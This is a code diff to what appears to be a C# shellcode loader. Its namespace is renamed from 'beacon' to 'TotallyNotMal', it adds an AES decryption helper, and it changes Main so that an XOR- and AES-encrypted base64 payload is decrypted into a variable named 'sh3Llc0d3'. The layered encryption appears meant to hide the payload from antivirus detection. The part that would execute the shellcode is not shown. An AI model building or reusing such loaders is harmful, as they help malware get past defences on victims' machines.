@@ -10,7 +10,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace beacon
+namespace TotallyNotMal
 {
     public class Program
     {
@@ -213,6 +213,29 @@ namespace beacon
 
         }
 
+            //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
+            public static byte[] AESDecrypt(byte[] cipherData, byte[] Key, byte[] IV)
+        {
+
+            MemoryStream ms = new MemoryStream();
+
+            Rijndael alg = Rijndael.Create();
+
+            alg.Key = Key;
+            alg.IV = IV;
+
+            CryptoStream cs = new CryptoStream(ms,
+                alg.CreateDecryptor(), CryptoStreamMode.Write);
+
+            cs.Write(cipherData, 0, cipherData.Length);
+
+            cs.Close();
+
+            byte[] decryptedData = ms.ToArray();
+
+            return decryptedData;
+        }
+
         public static void Main()
         {
 
@@ -225,7 +248,9 @@ namespace beacon
 
             byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
 
-            sh3Llc0d3 = Convert.FromBase64String(DecryptStringFromBytes(aesEncrypted, key, iv));
+            sh3Llc0d3 = AESDecrypt(aesEncrypted, key, iv);
+
+            //sh3Llc0d3 = Convert.FromBase64String(DecryptStringFromBytes(aesEncrypted, key, iv));
 
             //var decrypted = DecryptStringFromBytes(xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey),key,iv);
 
